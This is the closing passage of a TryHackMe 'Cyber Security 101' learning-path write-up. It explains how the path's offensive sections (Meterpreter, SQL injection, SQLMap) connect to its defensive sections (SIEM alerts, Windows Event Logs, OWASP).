The offensive and defensive sections mirror each other deliberately. Understanding how Meterpreter works (Section 7) directly informs what you look for in SIEM alerts (Section 10) and Windows Event Logs (Section 5). Understanding SQL injection (Section 8) makes the SQLMap room (Section 9) mechanical rather than magical. The OWASP rooms in Section 14 put formal names and categories on vulnerabilities you've been exploiting throughout the path.

---

*Writeup by [gresium](https://tryhackme.com/p/gresium) | TryHackMe — Cyber Security 101 Path*
